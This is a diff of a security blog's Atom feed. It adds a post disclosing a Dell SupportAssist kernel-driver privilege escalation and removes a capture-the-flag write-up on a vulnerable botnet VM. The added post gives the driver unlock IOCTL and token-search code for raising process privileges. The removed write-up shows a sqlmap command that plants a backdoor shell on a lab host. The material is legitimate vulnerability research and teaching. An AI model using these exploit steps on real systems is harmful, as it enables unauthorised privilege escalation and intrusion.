@@ -4,7 +4,7 @@
   <title><![CDATA[]]></title>
   <link href="http://hatRiot.github.io/atom.xml" rel="self"/>
   <link href="http://hatRiot.github.io/"/>
-  <updated>2017-09-20T09:56:58-07:00</updated>
+  <updated>2018-05-17T23:03:31-07:00</updated>
   <id>http://hatRiot.github.io/</id>
   <author>
     <name><![CDATA[Bryan Alexander]]></name>
@@ -12,6 +12,303 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Dell SupportAssist Driver - Local Privilege Escalation]]></title>
+    <link href="http://hatRiot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation/"/>
+    <updated>2018-05-17T21:00:00-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2018/05/17/dell-supportassist-local-privilege-escalation</id>
+    <content type="html"><![CDATA[<p>This post details a local privilege escalation (LPE) vulnerability I found
+in Dell&rsquo;s SupportAssist[0] tool. The bug is in a kernel driver loaded by
+the tool, and is pretty similar to bugs found by ReWolf in
+ntiolib.sys/winio.sys[1], and those found by others in ASMMAP/ASMMAP64[2].
+These bugs are pretty interesting because they can be used to bypass driver
+signature enforcement (DSE) ad infinitum, or at least until they&rsquo;re no longer
+compatible with newer operating systems.</p>
+
+<p>Dell&rsquo;s SupportAssist is, according to the site, &ldquo;(..) now preinstalled on most
+of all new Dell devices running Windows operating system (..)&rdquo;. It&rsquo;s primary
+purpose is to troubleshoot issues and provide support capabilities both to the
+user and to Dell. There&rsquo;s quite a lot of functionality in this software itself,
+which I spent quite a bit of time reversing and may blog about at a later date.</p>
+
+<h2>Bug</h2>
+
+<p>Calling this a &ldquo;bug&rdquo; is really a misnomer; the driver exposes this
+functionality eagerly. It actually exposes a lot of functionality, much like
+some of the previously mentioned drivers. It provides capabilities for reading
+and writing the model-specific register (MSR), resetting the 1394 bus, and
+reading/writing CMOS.</p>
+
+<p>The driver is first loaded when the SupportAssist tool is launched, and the
+filename is <code>pcdsrvc_x64.pkms</code> on x64 and <code>pcdsrvc.pkms</code> on x86. Incidentally,
+this driver isn&rsquo;t actually even built by Dell, but rather another company,
+PC-Doctor[3]. This company provides &ldquo;system health solutions&rdquo; to a variety of
+companies, including Dell, Intel, Yokogawa, IBM, and others. Therefore, it&rsquo;s
+highly likely that this driver can be found in a variety of other products&hellip;</p>
+
+<p>Once the driver is loaded, it exposes a symlink to the device at
+<code>PCDSRVC{3B54B31B-D06B6431-06020200}_0</code> which is writable by unprivileged users
+on the system. This allows us to trigger one of the many IOCTLs exposed by the
+driver; approximately 30. I found a DLL used by the userland agent that served
+as an interface to the kernel driver and conveniently had symbol names
+available, allowing me to extract the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>// 0x222004 = driver activation ioctl
+</span><span class='line'>// 0x222314 = IoDriver::writePortData
+</span><span class='line'>// 0x22230c = IoDriver::writePortData
+</span><span class='line'>// 0x222304 = IoDriver::writePortData
+</span><span class='line'>// 0x222300 = IoDriver::readPortData
+</span><span class='line'>// 0x222308 = IoDriver::readPortData
+</span><span class='line'>// 0x222310 = IoDriver::readPortData
+</span><span class='line'>// 0x222700 = EcDriver::readData
+</span><span class='line'>// 0x222704 = EcDriver::writeData
+</span><span class='line'>// 0x222080 = MemDriver::getPhysicalAddress
+</span><span class='line'>// 0x222084 = MemDriver::readPhysicalMemory
+</span><span class='line'>// 0x222088 = MemDriver::writePhysicalMemory
+</span><span class='line'>// 0x222180 = Msr::readMsr
+</span><span class='line'>// 0x222184 = Msr::writeMsr
+</span><span class='line'>// 0x222104 = PciDriver::readConfigSpace
+</span><span class='line'>// 0x222108 = PciDriver::writeConfigSpace
+</span><span class='line'>// 0x222110 = PciDriver::?
+</span><span class='line'>// 0x22210c = PciDriver::?
+</span><span class='line'>// 0x222380 = Port1394::doesControllerExist
+</span><span class='line'>// 0x222384 = Port1394::getControllerConfigRom
+</span><span class='line'>// 0x22238c = Port1394::getGenerationCount
+</span><span class='line'>// 0x222388 = Port1394::forceBusReset
+</span><span class='line'>// 0x222680 = SmbusDriver::genericRead
+</span><span class='line'>// 0x222318 = SystemDriver::readCmos8
+</span><span class='line'>// 0x22231c = SystemDriver::writeCmos8
+</span><span class='line'>// 0x222600 = SystemDriver::getDevicePdo
+</span><span class='line'>// 0x222604 = SystemDriver::getIntelFreqClockCounts
+</span><span class='line'>// 0x222608 = SystemDriver::getAcpiThermalZoneInfo</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Immediately the MemDriver class jumps out. After some reversing, it appeared
+that these functions do exactly as expected: allow userland services to both
+read and write arbitrary physical addresses. There are a few quarks, however.</p>
+
+<p>To start, the driver must first be &ldquo;unlocked&rdquo; in order for it to begin
+processing control codes. It&rsquo;s unclear to me if this is some sort of hacky
+event trigger or whether the kernel developers truly believed this would
+inhibit malicious access. Either way, it&rsquo;s goofy. To unlock the driver, a
+simple ioctl with the proper code must be sent. Once received, the driver will
+process control codes for the lifetime of the system.</p>
+
+<p>To unlock the driver, we just execute the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>BOOL bResult;
+</span><span class='line'>DWORD dwRet;
+</span><span class='line'>SIZE_T code = 0xA1B2C3D4, outBuf;
+</span><span class='line'>
+</span><span class='line'>bResult = DeviceIoControl(hDriver, 0x222004, 
+</span><span class='line'>                          &code, sizeof(SIZE_T), 
+</span><span class='line'>                          &outBuf, sizeof(SIZE_T), 
+</span><span class='line'>                          &dwRet, NULL);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Once the driver receives this control code and validates the received code
+(0xA1B2C3D4), it sets a global flag and begins accepting all other control
+codes.</p>
+
+<h2>Exploitation</h2>
+
+<p>From here, we could exploit this the same way rewolf did [4]: read out physical
+memory looking for process pool tags, then traverse these until we identify our
+process as well as a SYSTEM process, then steal the token. However, PCD
+appears to give us a shortcut via <code>getPhysicalAddress</code> ioctl. If this does
+indeed return the physical address of a given virtual address (VA), we can simply
+find the physical of our VA and enable a couple token privileges[5] using the
+<code>writePhysicalMemory</code> ioctl.</p>
+
+<p>Here&rsquo;s how the <code>getPhysicalAddress</code> function works:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>v5 = IoAllocateMdl(**(PVOID **)(a1 + 0x18), 1u, 0, 0, 0i64);
+</span><span class='line'>v6 = v5;
+</span><span class='line'>if ( !v5 )
+</span><span class='line'>  return 0xC0000001i64;
+</span><span class='line'>MmProbeAndLockPages(v5, 1, 0);
+</span><span class='line'>**(_QWORD **)(v3 + 0x18) = v4 & 0xFFF | ((_QWORD)v6[1].Next &lt;&lt; 0xC);
+</span><span class='line'>MmUnlockPages(v6);
+</span><span class='line'>IoFreeMdl(v6);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Keen observers will spot the problem here; the <code>MmProbeAndLockPages</code> call is
+passing in UserMode for the KPROCESSOR_MODE, meaning we won&rsquo;t be able to
+resolve any kernel mode VAs, only usermode addresses.</p>
+
+<p>We can still read chunks of physical memory unabated, however, as the
+<code>readPhysicalMemory</code> function is quite simple:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if ( !DoWrite )
+</span><span class='line'>{
+</span><span class='line'>  memmove(a1, a2, a3);
+</span><span class='line'>  return 1;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>They reuse a single function for reading and writing physical memory; we&rsquo;ll
+return to that. I decided to take a different approach than rewolf for a number
+of reasons with great results.</p>
+
+<p>Instead, I wanted to toggle on SeDebugPrivilege for my current process token.
+This would require finding the token in memory and writing a few bytes at a
+field offset. To do this, I used <code>readPhysicalMemory</code> to read chunks of memory
+of size 0x10000000 and checked for the first field in a _TOKEN, TokenSource. In
+a user token, this will be the string <code>User32</code>. Once we&rsquo;ve identified this,
+we double check that we&rsquo;ve found a token by validating the TokenLuid, which we
+can obtain from userland using the GetTokenInformation API.</p>
+
+<p>In order to speed up the memory search, I only iterate over the addresses that
+match the token&rsquo;s virtual address byte index. Essentially, when you convert a
+virtual address to a physical address (PA) the byte index, or the lower 12 bits,
+do not change. To demonstrate, assume we have a VA of 0xfffff8a001cc2060.
+Translating this to a physical address then:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; !pte  fffff8a001cc2060
+</span><span class='line'>                                           VA fffff8a001cc2060
+</span><span class='line'>PXE at FFFFF6FB7DBEDF88    PPE at FFFFF6FB7DBF1400    PDE at FFFFF6FB7E280070    PTE at FFFFF6FC5000E610
+</span><span class='line'>contains 000000007AC84863  contains 00000000030D4863  contains 0000000073147863  contains E6500000716FD963
+</span><span class='line'>pfn 7ac84     ---DA--KWEV  pfn 30d4      ---DA--KWEV  pfn 73147     ---DA--KWEV  pfn 716fd     -G-DA--KW-V
+</span><span class='line'>
+</span><span class='line'>kd&gt; ? 716fd * 0x1000 + 060
+</span><span class='line'>Evaluate expression: 1903153248 = 00000000`716fd060</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So our physical address is 0x716fd060 (if you&rsquo;d like to read more about
+converting VA to PA, check out this great Microsoft article[6]). Notice the
+lower 12 bits remain the same between VA/PA. The search loop then boiled down
+to the following code:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>uStartAddr = uStartAddr + (VirtualAddress & 0xfff);
+</span><span class='line'>for (USHORT chunk = 0; chunk &lt; 0xb; ++chunk) {
+</span><span class='line'>    lpMemBuf = ReadBlockMem(hDriver, uStartAddr, 0x10000000);
+</span><span class='line'>    for(SIZE_T i = 0; i &lt; 0x10000000; i += 0x1000, uStartAddr += 0x1000){
+</span><span class='line'>        if (memcmp((DWORD)lpMemBuf + i, "User32 ", 8) == 0){
+</span><span class='line'>            
+</span><span class='line'>            if (TokenId &lt;= 0x0)
+</span><span class='line'>                FetchTokenId();
+</span><span class='line'>
+</span><span class='line'>            if (*(DWORD*)((char*)lpMemBuf + i + 0x10) == TokenId) {
+</span><span class='line'>                hTokenAddr = uStartAddr;
+</span><span class='line'>                break;
+</span><span class='line'>            }
+</span><span class='line'>        }
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    HeapFree(GetProcessHeap(), 0, lpMemBuf);
+</span><span class='line'>
+</span><span class='line'>    if (hTokenAddr &gt; 0x0)
+</span><span class='line'>        break;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Once we identify the PA of our token, we trigger two separate writes at offset
+0x40 and offset 0x48, or the Enabled and Default fields of a _TOKEN. This
+sometimes requires a few runs to get right (due to mapping, which I was too
+lazy to work out), but is very stable.</p>
+
+<p>You can find the source code for the bug <a href="https://github.com/hatRiot/bugs">here</a>.</p>
+
+<h2>Timeline</h2>
+
+<p>04/05/18 &ndash; Vulnerability reported<br/>
+04/06/18 &ndash; Initial response from Dell<br/>
+04/10/18 &ndash; Status update from Dell<br/>
+04/18/18 &ndash; Status update from Dell<br/>
+05/16/18 &ndash; Patched version released (v2.2)</p>
+
+<h2>References</h2>
+
+<p>[0]
+<a href="http://www.dell.com/support/contents/us/en/04/article/product-support/self-support-knowledgebase/software-and-downloads/supportassist%0A">http://www.dell.com/support/contents/us/en/04/article/product-support/self-support-knowledgebase/software-and-downloads/supportassist
+</a>[1] <a href="http://blog.rewolf.pl/blog/?p=1630%0A">http://blog.rewolf.pl/blog/?p=1630
+</a>[2] <a href="https://www.exploit-db.com/exploits/39785/%0A">https://www.exploit-db.com/exploits/39785/
+</a>[3] <a href="http://www.pc-doctor.com/%0A">http://www.pc-doctor.com/
+</a>[4] <a href="https://github.com/rwfpl/rewolf-msi-exploit%0A">https://github.com/rwfpl/rewolf-msi-exploit
+</a>[5] <a href="https://github.com/hatRiot/token-priv%0A">https://github.com/hatRiot/token-priv
+</a>[6]
+<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses\">https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses\</a></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Abusing delay load DLLs for remote code injection]]></title>
@@ -6347,218 +6644,6 @@ Their analytics status/server monitoring application is vulnerable to a fairly t
 
 <p><a href="http://pastebin.com/JLh7BYYj">Exploit</a><br/>
 <a href="http://pastebin.com/GXdw3FcQ">wsdl</a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[solving RA1NXing Bots]]></title>
-    <link href="http://hatRiot.github.io/blog/2013/07/10/solving-ra1nxing-bots/"/>
-    <updated>2013-07-10T22:31:29-07:00</updated>
-    <id>http://hatRiot.github.io/blog/2013/07/10/solving-ra1nxing-bots</id>
-    <content type="html"><![CDATA[<p><a href="http://vulnhub.com/entry/ra1nxing-bots_1,52/">RA1NXing Bots</a> is a vulnerable image intended to jump start security researches&#8217; interest in botnets and their exploitability.  This vulnerable image was brought to us by Brian Wallace (<a href="https://twitter.com/botnet_hunter">@botnet_hunter</a>), a botnet security researcher at Cylance and good friend (and Ballast Security co-founder).  This was a pretty interesting  vulnerable image, and good exposure into the sometimes seedy and malevolent world of botnets.</p>
-
-<p>As such, the iconic nmap:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># Nmap 6.25 scan initiated Mon Jul  8 02:08:29 2013 as: nmap -sS -A -T5 -p- -oN bot.scan 192.168.1.198
-</span><span class='line'>Nmap scan report for 192.168.1.198
-</span><span class='line'>Host is up (0.00044s latency).
-</span><span class='line'>Not shown: 65531 closed ports
-</span><span class='line'>PORT     STATE SERVICE VERSION
-</span><span class='line'>22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze3 (protocol 2.0)
-</span><span class='line'>| ssh-hostkey: 1024 a2:24:9c:39:48:84:7f:da:1f:51:b9:0a:1b:45:df:aa (DSA)
-</span><span class='line'>|_2048 35:f5:0e:fa:c3:6b:98:8a:25:e1:f8:bf:de:38:82:03 (RSA)
-</span><span class='line'>80/tcp   open  http    Apache httpd 2.2.16 ((Debian))
-</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 302)
-</span><span class='line'>| http-title: Site doesn't have a title (text/html).
-</span><span class='line'>|_Requested resource was /index.php?page=main
-</span><span class='line'>111/tcp  open  rpcbind 2-4 (RPC #100000)
-</span><span class='line'>| rpcinfo:
-</span><span class='line'>|   program version   port/proto  service
-</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
-</span><span class='line'>|_  100000  2,3,4        111/udp  rpcbind
-</span><span class='line'>6667/tcp open  irc     IRCnet ircd
-</span><span class='line'>| irc-info: Server: irc.localhost
-</span><span class='line'>| Version: 2.11.2p2. irc.localhost 000A
-</span><span class='line'>| Lservers/Lusers: 0/3
-</span><span class='line'>| Uptime: 0 days, 0:10:37
-</span><span class='line'>| Source host: 192.168.1.147
-</span><span class='line'>|_Source ident: NONE or BLOCKED
-</span><span class='line'>MAC Address: 08:00:27:4B:51:94 (Cadmus Computer Systems)
-</span><span class='line'>Aggressive OS guesses: Linux 2.6.31 (98%), Linux 2.6.32 - 2.6.35 (97%), Linux 2.6.32 - 3.6 (96%), Netgear DG834G WAP or Western Digital WD TV media player (96%), Linux 2.6.17 - 2.6.36 (96%), Linux 2.6.23 - 2.6.38 (95%), Linux 2.6.22 (95%), Linux 2.6.18 - 2.6.21 (95%), AXIS 210A or 211 Network Camera (Linux 2.6) (95%), Linux 2.6.18 - 2.6.32 (94%)
-</span><span class='line'>No exact OS matches for host (test conditions non-ideal).
-</span><span class='line'>Network Distance: 1 hop
-</span><span class='line'>Service Info: Host: irc.localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span><span class='line'>
-</span><span class='line'>TRACEROUTE
-</span><span class='line'>HOP RTT     ADDRESS
-</span><span class='line'>1   0.44 ms 192.168.1.198
-</span><span class='line'>
-</span><span class='line'>OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
-</span><span class='line'># Nmap done at Mon Jul  8 02:08:52 2013 -- 1 IP address (1 host up) scanned in 23.34 seconds</span></code></pre></td></tr></table></div></figure>
-
-
-<p>The two services of interest are the HTTP server and IRC.  The web server comprises a few links with some incredibly basic pages, one of which is an obvious front door at first glance:</p>
-
-<p><img class="center" src="http://4.bp.blogspot.com/-5SaQmKH03_w/Ud4LthG_-AI/AAAAAAAAAgk/QzjHS8CoXNw/s640/login.jpg"></p>
-
-<p>Grabbing the request and handing it off to sqlmap, we quickly have a shell:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/lib_mysqludf_sys-master# sqlmap -u http://192.168.1.198/index.php?page=login --data 'user=blah&password=blah' -p user --os-shell
-</span><span class='line'>[....]
-</span><span class='line'>[20:33:03] [INFO] the file stager has been successfully uploaded on '/var/www' - http://192.168.1.198:80/tmpufqvr.php
-</span><span class='line'>[20:33:03] [INFO] the backdoor has been successfully uploaded on '/var/www' - http://192.168.1.198:80/tmpbqsug.php
-</span><span class='line'>[20:33:03] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
-</span><span class='line'>os-shell&gt; whoami
-</span><span class='line'>do you want to retrieve the command standard output? [Y/n/a] a
-</span><span class='line'>command standard output:    'www-data'
-</span><span class='line'>os-shell&gt; </span></code></pre></td></tr></table></div></figure>
-
-
-<p>Dumping out the kernel and listening services doesn&rsquo;t give us anything new.  A local mysql database was set up, and the root password was found in <code>/var/www/main.php</code>, but we can&rsquo;t UDF into it due to file restrictions.  Inside the web root is source for the web site, as well as a <code>/var/www/botsources</code>, which includes the source code for the Ra1nX bot.  This source will come in handy as we explore the system more thoroughly.</p>
-
-<p>At the head of the bot we&rsquo;ve got a bunch of parameters defined; including its connection location and port:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$servers        = "127.0.0.1";
-</span><span class='line'>$ports            = "6667";
-</span><span class='line'>$admins            = "";
-</span><span class='line'>$channels        = "#somechannel";
-</span><span class='line'>$realnames         = "jhl";
-</span><span class='line'>$nicknames         = "jhl1,jhl2,jhl3,jhl4,jhl5,jhl6,jhl7,jhl8,jhl9,jhl10,jhl11,jhl12,jhl13,jhl14,jhl15,jhl16,jhl17,jhl18,jhl19,jhl20,jhl21,jhl22,jhl23,jhl24,jhl25,jhl26,jhl27,jhl28,jhl29,jhl30";
-</span><span class='line'>$chanpass     = "trolol";</span></code></pre></td></tr></table></div></figure>
-
-
-<p>If we attempt to connect to the IRC server and join the channel, we get <code>Cannot join to channel #somechannel (Bad channel key)</code>, which is the result of an incorrect password.  The source code specifies a password, but it doesn&rsquo;t work.  Could the bot be changed?</p>
-
-<p><img class="center" src="http://3.bp.blogspot.com/-lR4idXiox9w/Ud4PQAVFmLI/AAAAAAAAAg0/GLEUZx8R9xE/s640/bot_root.jpg"></p>
-
-<p>Looks like some PHP script is being run as root; likely our culprit.  The issue now is communicating with the bot and somehow exploiting it to give us a root shell.  Time to hit that source we grabbed.</p>
-
-<p>As given above, we have a list of nicknames, a channel, server, and password.  The password doesn&rsquo;t work, so we need to figure out another way.  The bot connects to the server using the connection() function, and selects a random nickname/server/port:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>   while(!$SOCKET && ($try &lt;= $maxtryconn)){
-</span><span class='line'>        $server = random($servers);
-</span><span class='line'>        $port     = random($ports);
-</span><span class='line'>        $SOCKET = fsockopen($server,$port,$err_num,$err_msg,30);
-</span><span class='line'>        $GLOBALS['SOCKET']=$SOCKET;
-</span><span class='line'>        $try++;
-</span><span class='line'>        sleep(1);
-</span><span class='line'>    }
-</span><span class='line'>    if(!$SOCKET) die("Cannot connect to remote host");
-</span><span class='line'>    if ($SOCKET){
-</span><span class='line'>        $GLOBALS['ident']     = $ident    = random($nicknames);
-</span><span class='line'>        $GLOBALS['nick']     = $nick     = random($nicknames);
-</span><span class='line'>        $GLOBALS['realname']= $realname    = random($realnames);
-</span><span class='line'>        SEND("USER XRay 127.0.0.1 localhost : -==Ra1NX Projection==-");
-</span><span class='line'>        NICK($nick);
-</span><span class='line'>        print "Connected to ".$server.":".$port." ".$nick." (XRay@".gethostbyname($_SERVER["HTTP_HOST"]).") Ra1NX Projection\r\n";
-</span><span class='line'>        flush();sleep(1);
-</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Once connected to a server, it begins listening for commands.  Text is read off the socket and sent to the <code>parser</code> function, which then, obviously, parses and acts upon the input.  The interesting bit to us is the following snippet:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>  if(substr($line[3],1,strlen($line[3]))==$nick){ $pubcalled = true; }
-</span><span class='line'>    if($pubcalled){
-</span><span class='line'>        if ($typeMsg=="PRIVMSG" && $user && $pubcalled && $pubcmd) {
-</span><span class='line'>            if(function_exists($pubcmd)){
-</span><span class='line'>                $sender = "PRIVMSG ".$dropMsg." "._;
-</span><span class='line'>                $GLOBALS['sender'] = $sender;
-</span><span class='line'>                $arg = str_replace("\r","",$arg);
-</span><span class='line'>                $arg = str_replace("\n","",$arg);
-</span><span class='line'>                $pubcmd($arg);
-</span><span class='line'>            }
-</span><span class='line'>        }
-</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Essentially, once parsed, a valid command to the bot appears <code>bot nick | @command | arguments</code>
-It&rsquo;s also of interest that none of this code verifies the authenticity of the request, nor that it&rsquo;s even coming from a channel.  All we need to do, then, is log into the IRC server and iterate through all available nicknames until we find the connected bot.</p>
-
-<p><img class="center" src="http://2.bp.blogspot.com/-mTV_DW3zLVk/Ud4Uu8woPnI/AAAAAAAAAhE/yb2drFOGxp0/s640/r00t.jpg"></p>
-
-<p>Game over.  Fun image, and looking forward to future botnet scenarios.</p>
 ]]></content>
   </entry>
   
